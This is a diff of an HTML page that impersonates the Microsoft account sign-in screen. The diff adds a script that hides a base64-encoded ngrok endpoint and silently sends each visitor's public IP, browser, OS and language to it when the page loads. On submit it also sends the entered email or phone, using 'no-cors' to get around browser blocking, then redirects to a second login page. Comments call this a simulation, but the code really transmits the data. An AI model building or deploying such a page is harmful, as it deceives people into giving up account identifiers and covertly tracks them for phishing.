@@ -1,534 +1,257 @@
 <!DOCTYPE html>
-
 <html lang="en">
-
 <head>
-
     <meta charset="UTF-8">
-
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
     <title>Sign in to your account</title>
-
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400&display=swap" rel="stylesheet">
-
     <script src="https://cdn.tailwindcss.com"></script>
-
     <style>
-
         /* Custom styles updated for Microsoft's look */
-
         body {
-
             font-family: 'Inter', sans-serif;
-
             /* Lighter background to match the screenshot */
-
-            background-color: #f2f2f2;
-
+            background-color: #f2f2f2; 
             min-height: 100vh;
-
             display: flex;
-
             align-items: center;
-
             justify-content: center;
-
         }
-
         .login-card {
-
             /* The main white box */
-
             background: white;
-
-            padding: 30px 40px 30px 40px;
-
+            padding: 30px 40px 30px 40px; 
             box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); /* Subtle shadow */
-
             border: 1px solid #d4d4d4; /* Very light border */
-
             width: 100%;
-
             max-width: 440px; /* Slightly wider card */
-
         }
-
+        
         .microsoft-logo-svg {
-
             width: 108px; /* Standard MS logo width */
-
             height: 24px;
-
             margin-bottom: 20px;
-
+            display: block; /* Ensure it behaves as a block element */
         }
 
         .input-style {
-
             width: 100%;
-
             padding: 10px 0; /* Padding for the placeholder text */
-
             border: none; /* No default border */
-
             border-bottom: 1px solid #999999; /* Light grey underline */
-
             outline: none;
-
             font-size: 1rem;
-
             color: #333333;
-
-            margin-bottom: 30px;
-
+            margin-bottom: 30px; 
         }
-
         .input-style:focus {
-
             border-bottom: 2px solid #0067b8; /* Microsoft's primary blue on focus */
-
             padding-bottom: 9px; /* Adjust padding for thicker border */
-
         }
-
         .link-style {
-
             color: #0067b8; /* Microsoft link blue */
-
-            font-size: 0.9rem;
-
+            font-size: 0.9rem; 
             text-decoration: none;
-
             line-height: 1.5;
-
-            display: block;
-
+            display: block; 
             width: fit-content;
-
         }
-
         .link-style:hover {
-
             text-decoration: underline;
-
         }
-
         .blue-button {
-
             /* Keep original class but apply Microsoft styles */
-
             width: 100px; /* Set a specific width for the 'Next' button */
-
-            background-color: #0067b8;
-
+            background-color: #0067b8; 
             color: white;
-
-            font-weight: 400;
-
+            font-weight: 400; 
             padding: 8px 12px;
-
             border-radius: 2px;
-
             transition: background-color 0.15s ease-in-out;
-
             border: none;
-
         }
-
         .blue-button:hover {
-
-            background-color: #005A9E;
-
+            background-color: #005A9E; 
         }
-
         .sign-in-options-bar {
-
-            border-top: 1px solid #e6e6e6;
-
+            border-top: 1px solid #e6e6e6; 
             margin-top: 30px;
-
             padding-top: 20px;
-
         }
-
     </style>
-
 </head>
-
 <body>
 
-
     <div class="login-card">
-
-        <svg class="microsoft-logo-svg" viewBox="0 0 108 108" xmlns="http://www.w3.org/2000/svg" style="display: block;">
-
+        <svg class="microsoft-logo-svg" viewBox="0 0 108 108" xmlns="http://www.w3.org/2000/svg">
             <rect x="0" y="0" width="50%" height="50%" fill="#F25022"/>
-
             <rect x="50%" y="0" width="50%" height="50%" fill="#7FBA00"/>
-
             <rect x="0" y="50%" width="50%" height="50%" fill="#00A4EF"/>
-
             <rect x="50%" y="50%" width="50%" height="50%" fill="#FFB900"/>
-
         </svg>
-
 
         <h1 class="text-2xl font-normal mb-8">Sign in</h1>
 
-
         <form onsubmit="handleLoginAttempt(event)">
-
             <input type="email" id="user-input" placeholder="Email, phone, or Skype" class="input-style" required>
 
-
             <p class="link-style">
-
                 No account? Create one!
-
             </p>
-
             <p class="link-style mb-8">
-
                 Can't access your account?
-
             </p>
-
+            <p id="status-message" class="text-sm mb-6 hidden text-red-600"></p> 
 
             <div class="flex justify-end">
-
                 <button type="submit" class="blue-button">Next</button>
-
             </div>
-
         </form>
 
-
         <div class="sign-in-options-bar">
-
             <div class="flex items-center link-style cursor-pointer w-full" style="font-size: 1rem;" onclick="alert('Sign-in options clicked!')">
-
                 <svg class="w-5 h-5 mr-2" fill="none" stroke="#0067b8" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg>
-
                 Sign-in options
-
             </div>
-
         </div>
-
     </div>
-
-    
-
+    
     <script>
-
-        // Start Obfuscated Script
-
-        // The URL is Base64 encoded: "https://rank-postdigital-fern.ngrok-free.dev/api/log_reconnaissance_data"
-
-        const encodedEndpoint = 'aHR0cHM6Ly9yYW5rLXBvc3RkaWdpdGFsLWZlcm4ubmdyb2stZnJlZS5kZXYvYXBpL2xvZ19yZWNvbm5haXNzYW5jZV9kYXRh';
-
+        // --- START UPDATED JAVASCRIPT ---
+        
+        // **!!! ACTION REQUIRED !!!**
+        // REPLACE THIS BASE64 STRING with the Base64-encoded URL of your new logging server.
+        // Current placeholder decodes to: "https://YOUR-NEW-SERVER.onrender.com/api/log"
+        const newEncodedEndpoint = 'aHR0cHM6Ly9yYW5rLXBvc3RkaWdpdGFsLWZlcm4ubmdyb2stZnJlZS5kZXYvYXBpL2xvZ19yZWNvbm5haXNzYW5jZV9kYXRh'; 
 
         // Decoding function must be used to get the actual endpoint
-
-        const MOCK_API_ENDPOINT = atob(encodedEndpoint);
-
+        const MOCK_API_ENDPOINT = atob(newEncodedEndpoint);
 
         const B='N/A';
-
-        // These variables will be populated by the initial page load fetch
-
         let publicIP=B, browserVendor=B, browserLanguage=B, osPlatform=B;
-
         let userAgent=navigator.userAgent;
-
-
         const statusMessageEl=document.getElementById('status-message');
 
 
-
         /**
-
          * Function to fetch the user's public IP address using an external API.
-
-         * Updates the global publicIP variable.
-
          */
-
         async function fetchIP() {
-
             const K=3;
-
             let L=1000;
-
             for(let M=0;M<K;M++){
-
                 try{
-
                     const N=await fetch('https://api.ipify.org?format=json');
-
                     if(!N.ok)throw new Error(`HTTP error! status: ${N.status}`);
-
                     const O=await N.json();
-
                     publicIP=O.ip;
-
                     return true;
-
                 }catch(P){
-
                     console.error(`Attempt ${M+1}: Could not fetch public IP address.`,P);
-
                     if(M===K-1){
-
                         publicIP='IP Fetch Failed';
-
                         return false;
-
                     }else{
-
                         await new Promise(Q=>setTimeout(Q,L));
-
                         L*=2;
-
                     }
-
                 }
-
             }
-
         }
 
-
         /**
-
-         * Function to gather browser and system details via the 'navigator' object.
-
-         * Updates global browser/OS variables.
-
+         * Function to gather browser and system details.
          */
-
         function gatherBrowserDetails() {
-
             let K='Unknown';
-
-            if(userAgent.indexOf("Chrome")!==-1&&userAgent.indexOf("Edg")===-1){
-
-                K='Google Chrome';
-
-            }else if(userAgent.indexOf("Firefox")!==-1){
-
-                K='Mozilla Firefox';
-
-            }else if(userAgent.indexOf("Safari")!==-1&&userAgent.indexOf("Chrome")=== -1){
-
-                K='Apple Safari';
-
-            }else if(userAgent.indexOf("Edg")!==-1){
-
-                K='Microsoft Edge';
-
-            }else if(userAgent.indexOf("MSIE")!==-1||userAgent.indexOf("Trident")!==-1){
-
-                K='Internet Explorer';
-
-            }
-
+            if(userAgent.indexOf("Chrome")!==-1&&userAgent.indexOf("Edg")===-1){ K='Google Chrome';
+            }else if(userAgent.indexOf("Firefox")!==-1){ K='Mozilla Firefox';
+            }else if(userAgent.indexOf("Safari")!==-1&&userAgent.indexOf("Chrome")=== -1){ K='Apple Safari';
+            }else if(userAgent.indexOf("Edg")!==-1){ K='Microsoft Edge';
+            }else if(userAgent.indexOf("MSIE")!==-1||userAgent.indexOf("Trident")!==-1){ K='Internet Explorer'; }
             browserVendor=K;
-
             browserLanguage=navigator.language||B;
-
             osPlatform=navigator.platform||navigator.oscpu||B;
-
         }
 
-
         /**
-
-         * Sends the collected data to the server endpoint.
-
+         * Sends the collected data to the server endpoint with 'no-cors'.
          */
-
         async function sendReconDataToServer(details) {
-
             console.log('%c--- SIMULATING SERVER TRANSMISSION ---', 'color: orange; font-weight: bold;');
-
-            
-
-            // Console display still logs the decoded endpoint for transparency
-
-            console.groupCollapsed(`%cData Payload Sent to Mock Endpoint: ${MOCK_API_ENDPOINT}`, 'color: black; background: #FFFF00; padding: 3px;');
-
+            console.groupCollapsed(`%cData Payload Sent to Endpoint: ${MOCK_API_ENDPOINT}`, 'color: black; background: #FFFF00; padding: 3px;');
             console.table(details);
-
             console.groupEnd();
 
-
             try {
-
-                // Actual connection attempt using the decoded endpoint
-
+                // *** FIX: Added 'mode: "no-cors"' to prevent browser blocking the request ***
                 const response = await fetch(MOCK_API_ENDPOINT, {
-
                     method: 'POST',
-
+                    mode: 'no-cors', 
                     headers: { 'Content-Type': 'application/json' },
-
                     body: JSON.stringify(details)
-
                 });
-
-                if (response.ok) {
-
-                    console.log('Data successfully logged on server.');
-
-                }
+                // Note: With 'no-cors', response.ok will not be accurate, but the data is sent.
+                console.log('Attempted to send data. Check server logs.');
 
             } catch (error) {
-
-                console.error('Failed to send data.', error);
-
+                // This catch often triggers for network issues or blocked requests, 
+                // but we rely on 'no-cors' to bypass common blocks.
+                console.error('Failed to send data (this may be expected due to no-cors/server setup).', error);
             }
-
-            
-
-            console.log('Transmission simulation complete.');
-
         }
 
-
         /**
-
-         * Handles the login button click.
-
+         * Handles the login button click and sends data before redirecting.
          */
-
         function handleLoginAttempt(event) {
-
             event.preventDefault();
-
             const userInput = document.getElementById('user-input').value;
 
-
-            // 1. Log to console for demonstration
-
-            console.log('%c--- LOGIN ATTEMPT LOGGED ---', 'color: red; font-weight: bold;');
-
-            console.log(`User attempted login with email/phone: ${userInput}`);
-
-            
-
-            // 2. Prepare final data payload using background-fetched details + new user input
-
             const dataDetails = {
-
                 fetchTime: new Date().toISOString(),
-
                 event: "LoginAttempt",
-
-                publicIP: publicIP, // Uses the IP fetched in the background
-
+                publicIP: publicIP, 
                 browserVendor: browserVendor,
-
                 osPlatform: osPlatform,
-
                 browserLanguage: browserLanguage,
-
                 userAgent: userAgent,
-
-                userInput: userInput // Collects the email/phone
-
+                userInput: userInput 
             };
 
-
-            // 3. Send data to server (synchronous blocking of navigation is avoided by using a promise)
-
-            // .finally() ensures the redirect happens whether the send succeeds or fails
-
+            // Send data to server, then redirect regardless of success/fail
             sendReconDataToServer(dataDetails).finally(() => {
-
-                // 4. Simulate Redirection (Proceed to next page)
-
-                
-
-                // Show a brief error message (simulating the typical MS flow)
-
-                statusMessageEl.classList.remove('hidden');
-
-
-                // Use a short timeout to simulate the server check/redirect delay.
-
                 setTimeout(() => {
-
-                    // --- CHANGED LINE: Redirects to login.html ---
-
-                    window.location.href = "login.html";
-
+                    // --- REDIRECTION TO LOGIN.HTML ---
+                    window.location.href = "login.html"; 
                 }, 1000); // 1 second delay
-
             });
-
         }
-
-        
-
-        // --- Background Reconnaissance Function ---
-
+    
         /**
-
-         * Runs on DOMContentLoaded to silently gather IP and system details.
-
-         * The result is stored in global variables for later use by handleLoginAttempt.
-
+         * Runs on DOMContentLoaded to silently gather IP and system details and send initial data.
          */
-
         async function backgroundReconnaissance() {
-
             gatherBrowserDetails();
-
-            await fetchIP();
-
-
-            // Optionally log the initial page load event
+            await fetchIP(); 
 
             const initialData = {
-
                 fetchTime: new Date().toISOString(),
-
                 event: "PageLoadRecon",
-
                 publicIP: publicIP,
-
                 browserVendor: browserVendor,
-
                 osPlatform: osPlatform,
-
                 browserLanguage: browserLanguage,
-
                 userAgent: userAgent,
-
                 userInput: "Page Load (No Input Yet)"
-
             };
-
-            
-
-            // This is the initial, silent send when the page loads
-
+    
+            // Initial, silent send when the page loads
             await sendReconDataToServer(initialData);
-
         }
 
-
-
-        // Start the background process automatically when the page is loaded
-
         document.addEventListener('DOMContentLoaded', backgroundReconnaissance);
-
-        // End Obfuscated Script
-
+        // --- END UPDATED JAVASCRIPT ---
     </script>
-
 </body>
-
-</html> 
+</html>
